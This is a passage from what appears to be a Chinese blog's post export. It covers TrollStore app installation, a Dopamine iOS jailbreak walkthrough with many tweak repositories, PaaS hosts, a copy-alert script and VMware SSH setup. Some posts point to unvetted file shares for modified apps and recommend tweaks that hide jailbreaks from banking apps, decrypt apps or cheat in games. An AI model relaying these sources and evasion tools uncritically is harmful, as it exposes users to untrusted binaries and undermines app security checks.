id="5-现在可以自由任意安装APP，下载IPA文件到手机，使用Trollstore安装即可。或者通过Safari浏览器下载IPA文件。"><a href="#5-现在可以自由任意安装APP，下载IPA文件到手机，使用Trollstore安装即可。或者通过Safari浏览器下载IPA文件。" class="headerlink" title="5.现在可以自由任意安装APP，下载IPA文件到手机，使用Trollstore安装即可。或者通过Safari浏览器下载IPA文件。"></a>5.现在可以自由任意安装APP，下载IPA文件到手机，使用Trollstore安装即可。或者通过Safari浏览器下载IPA文件。</h2><h1 id="TrollStore-安装APP方法"><a href="#TrollStore-安装APP方法" class="headerlink" title="TrollStore 安装APP方法:"></a>TrollStore 安装APP方法:</h1><h2 id="1-下载需要安装的APP的IPA文件（例如微信、或者抖音。微信多开的方法很简单，下载多开微信，多开微信一定要安装标注是多开的，官替的都不是多开用的）。附上互联网上收集的IPA资源链接："><a href="#1-下载需要安装的APP的IPA文件（例如微信、或者抖音。微信多开的方法很简单，下载多开微信，多开微信一定要安装标注是多开的，官替的都不是多开用的）。附上互联网上收集的IPA资源链接：" class="headerlink" title="1.下载需要安装的APP的IPA文件（例如微信、或者抖音。微信多开的方法很简单，下载多开微信，多开微信一定要安装标注是多开的，官替的都不是多开用的）。附上互联网上收集的IPA资源链接："></a>1.下载需要安装的APP的IPA文件（例如微信、或者抖音。微信多开的方法很简单，下载多开微信，多开微信一定要安装标注是多开的，官替的都不是多开用的）。附上互联网上收集的IPA资源链接：</h2><p><a href="https://pan.dumpapp.com/">https://pan.dumpapp.com</a></p>
<p><a href="https://pan.iosi.vip/">https://pan.iosi.vip/</a></p>
<p><a href="https://share.nyxz166.com/">https://share.nyxz166.com/</a></p>
<h2 id="2-打开上面的任意网址，切换到Download下载，一定是切换到Download下载选项，而不是直接安装。"><a href="#2-打开上面的任意网址，切换到Download下载，一定是切换到Download下载选项，而不是直接安装。" class="headerlink" title="2.打开上面的任意网址，切换到Download下载，一定是切换到Download下载选项，而不是直接安装。"></a>2.打开上面的任意网址，切换到Download下载，一定是切换到Download下载选项，而不是直接安装。</h2><h2 id="3-浏览找到你下载的文件，长按点击它，选择共享，点击TrollStore。自动跳转，点击install安装。"><a href="#3-浏览找到你下载的文件，长按点击它，选择共享，点击TrollStore。自动跳转，点击install安装。" class="headerlink" title="3.浏览找到你下载的文件，长按点击它，选择共享，点击TrollStore。自动跳转，点击install安装。"></a>3.浏览找到你下载的文件，长按点击它，选择共享，点击TrollStore。自动跳转，点击install安装。</h2><h2 id="4-安装完成，返回桌面，就可以永久使用了。不再有签名证书过期的烦恼。自由任意安装APP。"><a href="#4-安装完成，返回桌面，就可以永久使用了。不再有签名证书过期的烦恼。自由任意安装APP。" class="headerlink" title="4.安装完成，返回桌面，就可以永久使用了。不再有签名证书过期的烦恼。自由任意安装APP。"></a>4.安装完成，返回桌面，就可以永久使用了。不再有签名证书过期的烦恼。自由任意安装APP。</h2><h1 id="TrollFools2-7-huami-版"><a href="#TrollFools2-7-huami-版" class="headerlink" title="TrollFools2.7 huami 版"></a>TrollFools2.7 huami 版</h1><p>GitHub 地址 ： <a href="https://github.com/huami1314/TrollFools/releases">https://github.com/huami1314/TrollFools/releases</a></p>
<p><a href="https://www.123pan.com/s/oJCLVv-83Jvd?%E6%8F%90%E5%8F%96%E7%A0%81:Cxhy">https://www.123pan.com/s/oJCLVv-83Jvd?提取码:Cxhy</a><br>🎉iOS17.0巨魔资源推荐：<br><a href="https://www.123pan.com/s/oJCLVv-RzBvd.html">https://www.123pan.com/s/oJCLVv-RzBvd.html</a></p>
<p>巨魔IPA资源：<br><a href="https://pan.quark.cn/s/1d1961f8c778">https://pan.quark.cn/s/1d1961f8c778</a><br>iOS超全资源库：<br><a href="https://drive.uc.cn/s/5f684148dc034">https://drive.uc.cn/s/5f684148dc034</a><br>系统助手：<br><a href="https://joia.cn/system">https://joia.cn/system</a><br>十三资源库：<br><a href="https://tool.joia.cn/">https://tool.joia.cn</a><br>可以查询你的设备是否支持越狱或者巨魔等工具</p>
]]></content>
      <categories>
        <category>os</category>
        <category>ios</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ios</tag>
        <tag>trollstore</tag>
      </tags>
  </entry>
  <entry>
    <title>PaaS平台即服务大全</title>
    <url>/posts/33a0895/</url>
    <content><![CDATA[<h1 id="1-Replit"><a href="#1-Replit" class="headerlink" title="1.Replit"></a>1.Replit</h1><p>轻量化 即开即用的免费容器， 可以自动加载GitHub项目！ <a href="https://replit.com/">https://replit.com/</a></p>
<p>实例：火狐浏览器远程桌面：Firefox in Replit </p>
<p><a href="https://replit.com/@REHANSANISH/Firefox-in-Replit">https://replit.com/@REHANSANISH/Firefox-in-Replit</a></p>
<h1 id="2-vercel"><a href="#2-vercel" class="headerlink" title="2.vercel"></a>2.vercel</h1><p>Vercel的自动化部署速度非常快，简单易用，只需要几秒钟就能完成。这对于用户来说非常重要，因为它可以让我们更快地将代码部署到生产环境中，从而更快地验证我们的想法。 <a href="https://vercel.com/">https://vercel.com/</a></p>
<p>实例：部署Hexo博客</p>
<p><a href="https://vercel.com/new/clone?repository-url=https://github.com/EvanNotFound/vercel-hexo-template/tree/main&template=hexo">https://vercel.com/new/clone?repository-url=https://github.com/EvanNotFound/vercel-hexo-template/tree/main&amp;template=hexo</a></p>
<h1 id="3-ide-groom"><a href="#3-ide-groom" class="headerlink" title="3.ide.groom"></a>3.ide.groom</h1><p>韩国提供的一款免费容器 <a href="https://ide.goorm.io/">https://ide.goorm.io/</a></p>
<h1 id="4-railway"><a href="#4-railway" class="headerlink" title="4.railway"></a>4.railway</h1><p>Railway 已更新服务条款，每月增加了使用时长限制，新的服务条款导致每月最多只能运行 21 天左右， 除非你验证了信用卡，则没有这个限制。每个月提供5美元的免费额度，不休眠，不删数据，自定义域名，自动SSL加密 ! <a href="https://railway.app/">https://railway.app/</a></p>
<h1 id="5-Gitpod"><a href="#5-Gitpod" class="headerlink" title="5.Gitpod"></a>5.Gitpod</h1><p><a href="https://www.gitpod.io/">https://www.gitpod.io/</a></p>
<h1 id="6-Koyeb"><a href="#6-Koyeb" class="headerlink" title="6.Koyeb"></a>6.Koyeb</h1><p><a href="https://app.koyeb.com/">https://app.koyeb.com/</a></p>
<h1 id="部分开源项目"><a href="#部分开源项目" class="headerlink" title="部分开源项目"></a>部分开源项目</h1><p>RSSHub：<a href="https://github.com/DIYgod/RSSHub">https://github.com/DIYgod/RSSHub</a></p>
<p>ChatGPT-Next-Web：<a href="https://github.com/Yidadaa/ChatGPT-Next-Web">https://github.com/Yidadaa/ChatGPT-Next-Web</a></p>
]]></content>
      <categories>
        <category>web</category>
        <category>paas</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>paas</tag>
      </tags>
  </entry>
  <entry>
    <title>给网站加一个复制提醒弹窗</title>
    <url>/posts/df5f06d0/</url>
    <content><![CDATA[<p>复制下面代码，将其放置在网站footer.php或者header.php任意底部位子即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    &lt;!-- 复制提醒开始 --&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.bootcss.com/sweetalert/1.1.3/sweetalert.min.css&quot;</span> /&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;https://cdn.bootcss.com/sweetalert/1.1.3/sweetalert.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.body.oncopy = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">swal</span>(<span class="string">&quot;复制成功！&quot;</span>, <span class="string">&quot;若要转载请保留原文链接，感谢支持！&quot;</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;!-- 复制提醒结束 --&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web</category>
        <category>php</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7镜像安装与下载</title>
    <url>/posts/2f97930b/</url>
    <content><![CDATA[<h1 id="一、下载"><a href="#一、下载" class="headerlink" title="一、下载"></a>一、下载</h1><p>官网下载链接：<a href="https://www.centos.org/download/">https://www.centos.org/download/</a></p>
<p>1.根据自己机器的环境选择需要安装的版本（这里选择的是x86_64）<br>2.进入下载页，选择阿里云站点进行下载（此处站点没有限制，任选其一即可）<br>3.选择镜像进行下载</p>
<p>各个版本的ISO镜像文件说明：<br>CentOS-7-x86_64-DVD-2009.iso 标准安装版（推荐）<br>CentOS-7-x86_64-Everything-2009.iso 完整版，集成所有软件（以用来补充系统的软件或者填充本地镜像）<br>CentOS-7-x86_64-LiveGNOME-2009.iso GNOME桌面版<br>CentOS-7-x86_64-LiveKDE-2009.iso KDE桌面版<br>CentOS-7-x86_64-Minimal-2009.iso 精简版，自带的软件最少<br>CentOS-7-x86_64-NetInstall-2009.iso 网络安装版（从网络安装或者救援系统）</p>
]]></content>
      <categories>
        <category>os</category>
        <category>centos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>centos</tag>
      </tags>
  </entry>
  <entry>
    <title>dopamine 多巴胺越狱支持ios 15.0～15.4.1等 a12+苹果设备越狱</title>
    <url>/posts/266ec892/</url>
    <content><![CDATA[<h1 id="Dopamine官网"><a href="#Dopamine官网" class="headerlink" title="Dopamine官网"></a>Dopamine官网</h1><p><a href="https://ellekit.space/dopamine/">https://ellekit.space/dopamine/</a></p>
<p>旧版1.0.5<br><a href="https://wwsf.lanzouw.com/i7CPc11khe5e">https://wwsf.lanzouw.com/i7CPc11khe5e</a><br>密码:5wer</p>
<h1 id="A12-A15处理器的全新越狱工具发布了！Dopamine-中文名多巴胺"><a href="#A12-A15处理器的全新越狱工具发布了！Dopamine-中文名多巴胺" class="headerlink" title="A12~A15处理器的全新越狱工具发布了！Dopamine 中文名多巴胺"></a>A12~A15处理器的全新越狱工具发布了！Dopamine 中文名多巴胺</h1><p>Dopamine越狱是由巨魔商店TrollStore的作者opa334联合ellekit开发的。Dopamine多巴胺越狱在Fugu15的基础上，经过几个月的辛苦努力，公开的一个开源越狱工具，现在发布正式版，面向所有人员使用。<br>本站不欢迎IOS福利部落、手机一站式服务等微信公众号盗文抄袭者来访，请自觉离开、远离本站。</p>
<h1 id="Dopamine越狱支持的设备："><a href="#Dopamine越狱支持的设备：" class="headerlink" title="Dopamine越狱支持的设备："></a>Dopamine越狱支持的设备：</h1><p>iPhone XS、XR、XS Max、SE2、SE3、11、11Pro、11Pro Max、12、12mini、12Pro、12Pro Max、13、13mini、13Pro、13Pro Max。</p>
<p>iPad Air3、Air4、iPad Pro3、iPad Pro4、iPad9、iPad mini5、iPad mini6、M1芯片iPad。</p>
<h1 id="Dopamine越狱支持的iOS版本："><a href="#Dopamine越狱支持的iOS版本：" class="headerlink" title="Dopamine越狱支持的iOS版本："></a>Dopamine越狱支持的iOS版本：</h1><p>只支持iOS15.0~15.4.1<br>其他iOS15.0以下不支持、iOS15.5以上也不支持，不用再问，也永远不会支持，不要心存幻想。</p>
<h1 id="Dopamine和其他越狱工具的区别？"><a href="#Dopamine和其他越狱工具的区别？" class="headerlink" title="Dopamine和其他越狱工具的区别？"></a>Dopamine和其他越狱工具的区别？</h1><p>与其他的越狱工具相比较，例如我们熟知的unc0ver、checkra1n等，最大区别就是有根和无根。<br>unc0ver、checkra1n等越狱工具，获得是有根root越狱，可以获得完整的根权限。意思就是，你可以完全掌控手机系统，可以读写iOS操作系统，和用户分区系统，以及修改权限。但是，这其实是很危险的，很多朋友都有安装错误插件&#x2F;不兼容插件，导致手机白苹果情况。<br>Dopamine是无根越狱rootless，越狱之后，只向用户分区&#x2F;var&#x2F;jb&#x2F;目录的读写权限，不会向iOS根目录进行修改，就算越狱失败，或者插件不兼容，也不会影响整个手机系统，这是一项安全的进步。并且，可以快速逃避沙箱的检测，而且，随着越狱难度的提升，以后越狱社区，会面向无根越狱发展。巨魔商店就是个例子。<br>关于无根越狱，你可以看这篇详细的说明：<a href="https://theapplewiki.com/wiki/Rootless">https://theapplewiki.com/wiki/Rootless</a></p>
<h1 id="越狱插件的情况"><a href="#越狱插件的情况" class="headerlink" title="越狱插件的情况:"></a>越狱插件的情况:</h1><p>1，支持越狱插件。只支持无根rootless的越狱插件.这就意味着，你只能安装支持rootless FuGu15越狱的插件。<br>2023.05.15更新日志：1，修复了 forkfix 的问题，它会中断重新安装 dpkg,2，&#x2F;private&#x2F;preboot&#x2F;<UUID>越狱时自动修复权限错误<br>本教程不需要电脑，只需要安装了巨魔商店即可</p>
<h2 id="1，打开手机浏览器Safari，下载上面的工具。-请不要在微信里打开"><a href="#1，打开手机浏览器Safari，下载上面的工具。-请不要在微信里打开" class="headerlink" title="1，打开手机浏览器Safari，下载上面的工具。(请不要在微信里打开)"></a>1，打开手机浏览器Safari，下载上面的工具。(请不要在微信里打开)</h2><h2 id="2，找到下载的文件，解压出来，长按选中，选择–共享，然后选择巨魔商店打开，选择install安装。（如果没有巨魔商店，本教程无法继续进行，必须先安装巨魔商店，具体安装方法，请看本站首页文章）"><a href="#2，找到下载的文件，解压出来，长按选中，选择–共享，然后选择巨魔商店打开，选择install安装。（如果没有巨魔商店，本教程无法继续进行，必须先安装巨魔商店，具体安装方法，请看本站首页文章）" class="headerlink" title="2，找到下载的文件，解压出来，长按选中，选择–共享，然后选择巨魔商店打开，选择install安装。（如果没有巨魔商店，本教程无法继续进行，必须先安装巨魔商店，具体安装方法，请看本站首页文章）"></a>2，找到下载的文件，解压出来，长按选中，选择–共享，然后选择巨魔商店打开，选择install安装。（如果没有巨魔商店，本教程无法继续进行，必须先安装巨魔商店，具体安装方法，请看本站首页文章）</h2><h2 id="3，关闭手机上WiFi，返回桌面，点击Dopamine，点击Jailbreak，开始越狱。"><a href="#3，关闭手机上WiFi，返回桌面，点击Dopamine，点击Jailbreak，开始越狱。" class="headerlink" title="3，关闭手机上WiFi，返回桌面，点击Dopamine，点击Jailbreak，开始越狱。"></a>3，关闭手机上WiFi，返回桌面，点击Dopamine，点击Jailbreak，开始越狱。</h2><h2 id="4，越狱时，让你选择安装Sileo和Zebra软件管理仓库，推荐Sileo，等待越狱完成，自动黑屏注销桌面，解锁手机，越狱完成。"><a href="#4，越狱时，让你选择安装Sileo和Zebra软件管理仓库，推荐Sileo，等待越狱完成，自动黑屏注销桌面，解锁手机，越狱完成。" class="headerlink" title="4，越狱时，让你选择安装Sileo和Zebra软件管理仓库，推荐Sileo，等待越狱完成，自动黑屏注销桌面，解锁手机，越狱完成。"></a>4，越狱时，让你选择安装Sileo和Zebra软件管理仓库，推荐Sileo，等待越狱完成，自动黑屏注销桌面，解锁手机，越狱完成。</h2><h2 id="5，安装必备依赖Ellekit，否则无法安装任何插件。打开Sileo，软件源，点击Ellekit进去，安装它，重启Sileo，完成。"><a href="#5，安装必备依赖Ellekit，否则无法安装任何插件。打开Sileo，软件源，点击Ellekit进去，安装它，重启Sileo，完成。" class="headerlink" title="5，安装必备依赖Ellekit，否则无法安装任何插件。打开Sileo，软件源，点击Ellekit进去，安装它，重启Sileo，完成。"></a>5，安装必备依赖Ellekit，否则无法安装任何插件。打开Sileo，软件源，点击Ellekit进去，安装它，重启Sileo，完成。</h2><p>PreferenceLoader 插件必装，不装设置里面不会显示已安装的越狱插件<br>Cydia是过时产品，从iOS15开始，越狱不会安装Cydia，以后也不会支持。<br>Cydia和Sileo是一样的功能，没区别。</p>
<h1 id="如何清除越狱？"><a href="#如何清除越狱？" class="headerlink" title="如何清除越狱？"></a>如何清除越狱？</h1><p>打开Dopamine越狱，点击 清除越狱环境。（已经测试，安全有效保证）推荐此方法!!!</p>
<h1 id="已经测试支持的源和插件列表"><a href="#已经测试支持的源和插件列表" class="headerlink" title="已经测试支持的源和插件列表"></a>已经测试支持的源和插件列表</h1><p>以下都是无根越狱源：</p>
<p>搬运工源 </p>
<p><a href="https://byg.iosios.net/">https://byg.iosios.net</a></p>
<p>嘻哈源<br><a href="https://repo.acreson.cn/">https://repo.acreson.cn/</a><br>baraba源<br><a href="https://baraba-rootless.app/">https://baraba-rootless.app</a><br>dhinakg源<br><a href="https://dhinakg.github.io/repo">https://dhinakg.github.io/repo</a><br>ETHN源<br><a href="https://nahtedetihw.github.io/">https://nahtedetihw.github.io</a><br>Ginsu源<br><a href="https://repo.ginsu.dev/">https://repo.ginsu.dev</a><br>Nubela源<br><a href="https://apt.itsnebula.net/">https://apt.itsnebula.net/</a><br>little34306源: (推荐添加!!! )<br><a href="https://34306.github.io/">https://34306.github.io</a><br>Lizynz源<br><a href="https://lizynz.github.io/">https://lizynz.github.io</a><br>Zetsu分屏插件源<br><a href="https://dcsyhi1998.github.io/">https://dcsyhi1998.github.io/</a><br>XinaA15官方源<br><a href="https://apt.ss03.cn/">https://apt.ss03.cn</a><br>Sopppra源 SettingRevamp<br><a href="https://sopppra.mooo.com/">https://sopppra.mooo.com/</a><br>Nebbs’ 源<br><a href="https://repo.itznebbs.com/">https://repo.itznebbs.com/</a><br>Netskao’s Private 源 (推荐添加!!! )<br><a href="https://repo.initnil.com/">https://repo.initnil.com</a><br>NiceiOs源<br><a href="https://repo.niceios.com/">https://repo.niceios.com</a><br>palera1n源<br><a href="https://repo.palera.in/">https://repo.palera.in</a><br>巨魔大神作者opa334源<br><a href="https://opa334.github.io/">https://opa334.github.io/</a><br>PoomSmart’s源<br><a href="https://poomsmartgithub.io/repo">https://poomsmartgithub.io/repo</a><br>Akusio源(后台运行插件)<br><a href="https://akusio.github.io/">https://akusio.github.io</a><br>Snowboard源<br><a href="https://www.sparkdev.me/">https://www.sparkdev.me</a><br>Bigboss大老板源<br><a href="https://apt.thebigboss.org/repofiles/cydia/">https://apt.thebigboss.org/repofiles/cydia/</a><br>Ellekit源(必备)<br><a href="https://rootless.zqbb.cf/">https://rootless.zqbb.cf/</a><br>Zetsu源(必备)<br><a href="https://dcsyhi1998.github.io/">https://dcsyhi1998.github.io/</a><br>电话助手作者源：(推荐添加!!! )<br><a href="https://apt.htv123.com/">https://apt.htv123.com</a><br>老牌猫源™ (微信助手)<br><a href="https://apt.25mao.com/">https://apt.25mao.com</a><br>Shadow 屏蔽源™ (shadow屏蔽插件)<br><a href="https://ios.jjolano.me/">https://ios.jjolano.me</a><br>lenglengyu源™（短视频助手）<br><a href="https://lenglengyu.com/">https://lenglengyu.com</a><br>电话助手iOS15-Fugu15 (必须安装ellekit、preferenceloader、Altlist) 已测试</p>
<p>魔术师Fugu-15 ，电话助手源安装，已测试</p>
<p>snowboard主题插件(无根版) 34306源安装，已测试</p>
<p>短视频助手 lenglengyu源™安装 (快速高清保存无水印视频)，已测试</p>
<p>Ampere 1.0.8 电池电量百分比 Havoc源安装，已测试</p>
<p>Shadow 屏蔽越狱插件 Shadow源安装，已测试</p>
<p>Mterminal iOS模拟终端 已测试</p>
<p>Choicy 最强屏蔽越狱检测 (可以屏蔽所有银行软件越狱检测) opa334源安装 已测试</p>
<p>BackgrounderAction15 真后台运行插件 (完美后台运行APP) Akusio源安装 已测试</p>
<p>Zetsu 分屏插件 (真正的多屏显示) Zetsu源安装 已测试</p>
<p>PullOverPro 边栏快捷插件  Netskao’s Private源安装 已测试</p>
<p>PullOverPro 边栏快捷插件</p>
<p><strong>官方源</strong>地址(优先添加官方源)</p>
<p>多巴胺官网源(自带)<br><a href="https://ellekit.space/">https://ellekit.space/</a></p>
<p>opa334巨魔大佬源<br><a href="https://opa334.github.io/">https://opa334.github.io/</a></p>
<p>蜗牛源<br><a href="https://repo.snailovet.com/">https://repo.snailovet.com/</a></p>
<p>AudioRecorder 通话录音官方源<br><a href="http://limneos.net/repo/">http://limneos.net/repo/</a></p>
<p>Shuffle源 插件收纳官方源<br><a href="https://creaturecoding.com/repo/">https://creaturecoding.com/repo/</a></p>
<p>Brend0n源 歌词显示官方源<br><a href="https://brendonjkding.github.io/">https://brendonjkding.github.io/</a></p>
<p>免费砸壳官方源<br><a href="https://alias20.gitlab.io/apt">https://alias20.gitlab.io/apt</a></p>
<p>GinsuDev源 dodo源<br><a href="https://ginsu.dev/repo/">https://ginsu.dev/repo/</a></p>
<p>iCleaner Pro小扫把官方源<br><a href="https://ib-soft.net/cydia/beta/">https://ib-soft.net/cydia/beta/</a><br><a href="https://ib-soft.net/cydia/">https://ib-soft.net/cydia/</a></p>
<p>Netskao源镜像（赵楠）<br><a href="https://invalidunit.github.io/netskao-archive/">https://invalidunit.github.io/netskao-archive/</a></p>
<p>赵楠源（中文）官方源<br><a href="https://invalidunit.github.io/repo/">https://invalidunit.github.io/repo/</a><br><a href="https://invalidunit.github.io/repo2/">https://invalidunit.github.io/repo2/</a></p>
<p>乌其墨墨做的源<br><a href="https://lclrc.github.io/repo/">https://lclrc.github.io/repo/</a></p>
<p>真皮官方源（中文）<br><a href="https://rootless.zq666.eu.org/">https://rootless.zq666.eu.org/</a></p>
<p>SkyPian官方源（中文）<br><a href="https://skypain.github.io/repo/">https://skypain.github.io/repo/</a></p>
<p>NiceiOS官方源（中文）<br><a href="https://repo.niceios.com/">https://repo.niceios.com/</a></p>
<p>电话助手官方源（中文）<br><a href="http://apt.htv123.com/">http://apt.htv123.com/</a></p>
<p>Filza官方源<br><a href="http://tigisoftware.com/cydia/">http://tigisoftware.com/cydia/</a></p>
<p>老猫官方源（中文）<br><a href="https://apt.25mao.com/">https://apt.25mao.com/</a></p>
<p>苏兔官方源<br><a href="https://apt.sutuplus.com/">https://apt.sutuplus.com/</a></p>
<p>刀刀源（原嗨客源）汉化！<br><a href="https://xiangfeidexiaohuo.github.io/">https://xiangfeidexiaohuo.github.io/</a></p>
<p>poomsmart官方源<br><a href="https://poomsmart.github.io/repo/">https://poomsmart.github.io/repo/</a></p>
<p>越南老哥34306官方源<br><a href="https://34306.github.io/">https://34306.github.io</a></p>
<p>FolderX官方源<br><a href="https://lizynz.github.io/">https://lizynz.github.io/</a></p>
<p>CC真后台模块官方源<br><a href="http://akusio.github.io/">http://akusio.github.io</a></p>
<p>Zetsu分屏官方源<br><a href="http://dcsyhi1998.github.io/">http://dcsyhi1998.github.io/</a><br><a href="https://repo.anamy.gay/">https://repo.anamy.gay/</a></p>
<p>Snowboard官方源<br><a href="https://sparkdev.me/">https://sparkdev.me/</a></p>
<p>搬运工源<a href="https://byg.iosios.net/">https://byg.iosios.net/</a></p>
<p>百度主题源<a href="https://zhuti.iosios.net/">https://zhuti.iosios.net/</a></p>
<p>来了老弟源<a href="https://laileld.github.io/repo">https://laileld.github.io/repo</a></p>
<p>wwg135源<a href="https://wwg135.github.io/">https://wwg135.github.io/</a></p>
<p>学习交流源<a href="https://flyx099.github.io/repo/">https://flyx099.github.io/repo/</a></p>
<p>菠萝美化源<a href="https://themepro.yourepo.com/">https://themepro.yourepo.com/</a></p>
<p>H5GG游戏官方源<br><a href="https://apt.h5gg.app/">https://apt.h5gg.app/</a></p>
<p>iGG官方源<br><a href="https://aquawu.github.io/igg/">https://aquawu.github.io/igg/</a></p>
<p>iosgods官方源<br><a href="https://iosgods.com/repo/">https://iosgods.com/repo/</a></p>
<h2 id="其他未分类源"><a href="#其他未分类源" class="headerlink" title="其他未分类源"></a><strong>其他未分类源</strong></h2><p><a href="https://huayuarc.cn/">https://huayuarc.cn/</a><br><a href="https://cydia.akemi.ai/">https://cydia.akemi.ai/</a><br><a href="https://repo.mazh.top/">https://repo.mazh.top/</a><br><a href="https://apt.geometricsoftware.se/">https://apt.geometricsoftware.se/</a><br><a href="https://repo.anthopak.dev/">https://repo.anthopak.dev</a><br><a href="https://www.yourepo.com/">https://www.yourepo.com/</a><br><a href="https://julio.hackyouriphone.org/">https://julio.hackyouriphone.org/</a><br><a href="https://0xkuj.yourepo.com/">https://0xkuj.yourepo.com</a><br><a href="https://iosign.tk/">https://iosign.tk/</a><br><a href="https://apt.autotouch.net/rootless">https://apt.autotouch.net/rootless</a><br><a href="http://tigisoftware.com/repo/">http://tigisoftware.com/repo/</a><br><a href="https://liam.page/oldabi/">https://liam.page/oldabi/</a><br><a href="https://cydiageek.yourepo.com/">https://cydiageek.yourepo.com/</a><br><a href="https://miro92.com/repo/">https://miro92.com/repo/</a><br><a href="https://nahtedetihw.github.io/">https://nahtedetihw.github.io/</a><br><a href="https://repo.icrazeios.com/">https://repo.icrazeios.com/</a><br><a href="https://p2kdev.github.io/repo/">https://p2kdev.github.io/repo/</a><br><a href="https://dhinakg.github.io/repo/">https://dhinakg.github.io/repo/</a><br><a href="https://repo.itznebbs.com/">https://repo.itznebbs.com/</a><br><a href="https://0xilis.github.io/rootless/">https://0xilis.github.io/rootless/</a><br><a href="https://ios.jjolano.me/">https://ios.jjolano.me/</a><br><a href="https://repo.ikghd.me/">https://repo.ikghd.me/</a><br><a href="https://cydia.rob311.com/repo/">https://cydia.rob311.com/repo/</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>ios</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>dopamine</tag>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title>ssh访问vmware虚拟机（打通本地主机与虚拟机的网络）</title>
    <url>/posts/d87a53a2/</url>
    <content><![CDATA[<p>通过ssh访问虚拟机还是挺简单的，不过如果不熟悉的话，会耽误很多时间，我第一次搭建网络就耽误我很久，今天突然心血来潮记录一次如何配置使本地能访问vmware虚拟机。</p>
<p>这是我的虚拟机：<br><img src="/upload/2023/05/4f7879719265428e83dd0cda6d1b9f03.webp" alt="4f7879719265428e83dd0cda6d1b9f03"><br>想要ssh连上大概需要五步：</p>
<p>第一步，设置虚拟机与本地使用NAT模式</p>
<p>第二步，设置检查本地ip，设置虚拟机网络首选项的配置（建议固定ip，不然每次都要配置，很痛苦，方式在文中）</p>
<p>第三步，修改虚拟机ip</p>
<p>第四步，设置或者关闭防火墙。</p>
<p><strong>以我的centos-7为例，注意，只有vmware专业版才能实现ssh远程连接（非专业版我不会）：</strong></p>
<h2 id="第一步：设置虚拟机网络模式为NAT模式："><a href="#第一步：设置虚拟机网络模式为NAT模式：" class="headerlink" title="第一步：设置虚拟机网络模式为NAT模式："></a><strong>第一步：设置虚拟机网络模式为NAT模式：</strong></h2><p><img src="/upload/2023/05/35ff06d912474f3f8f1318d816e8926a.webp" alt="35ff06d912474f3f8f1318d816e8926a"></p>
<h2 id="第二步：查看本地ip，对虚拟机网络首选项进行配置"><a href="#第二步：查看本地ip，对虚拟机网络首选项进行配置" class="headerlink" title="第二步：查看本地ip，对虚拟机网络首选项进行配置"></a>第二步：查看本地ip，对虚拟机网络首选项进行配置</h2><p>打开运行（可以在搜索框中搜索“运行”），进入cmd，输入ipconfig，查看vmware network adapter vmnet8的ip和子网掩码：</p>
<p><img src="/upload/2023/05/4b777f8ce55b4f7ab505bef12f063f95.webp" alt="4b777f8ce55b4f7ab505bef12f063f95"></p>
<p><strong>插叙：</strong></p>
<p><strong>可以进入控制面板-&gt;网络和internet-&gt;网络和共享中心-&gt;更改适配器设置-&gt;右击VM8-&gt;点击属性-&gt;在属性的网络中找到<code>internet 协议版本4（TCP/IPv4）属性</code>（可能是英文的），然后设置网络ip，固定虚拟网卡ip，一次性不用下次再修改ip</strong></p>
<p><img src="/upload/2023/05/1353336a59bc4ae9be7f65b6b0756d09.webp" alt="1353336a59bc4ae9be7f65b6b0756d09"></p>
<p>使用虚拟网络编辑器设置好虚拟机的网络：</p>
<p><img src="/upload/2023/05/087b55bdc610490ba1e178fe4d47614a.webp" alt="087b55bdc610490ba1e178fe4d47614a"></p>
<h2 id="第三步，修改虚拟机ip："><a href="#第三步，修改虚拟机ip：" class="headerlink" title="第三步，修改虚拟机ip："></a>第三步，修改虚拟机ip：</h2><p>查看网卡：</p>
<p><img src="/upload/2023/05/c032e76406f8413fb73598226493aa0b.webp" alt="c032e76406f8413fb73598226493aa0b"></p>
<p>发现是ens33</p>
<p>修改 &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-ens33文件：</p>
<p><img src="/upload/2023/05/44f511f2e3194da48082e63009015069.webp" alt="44f511f2e3194da48082e63009015069"></p>
<p>ip和网关需要在同一个子网下。</p>
<p>重启网络：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>

<p>再次查看网络（ip addr），发现ens33的ip是我们期望的ip</p>
<h2 id="第五步-关闭防火墙"><a href="#第五步-关闭防火墙" class="headerlink" title="第五步 关闭防火墙"></a>第五步 关闭防火墙</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure>

<p>然后我们发现在物理机上ping我们的期望ip（如图所示是192.168.64.4）能ping通</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>vmware</category>
      </categories>
      <tags>
        <tag>vmware</tag>
      </tags>
  </entry>
  <entry>
    <title>pandora windows 本地搭建 chatgpt 无需api 免翻墙使用 openai 的全部功能</title>
    <url>/posts/bc933304/</url>
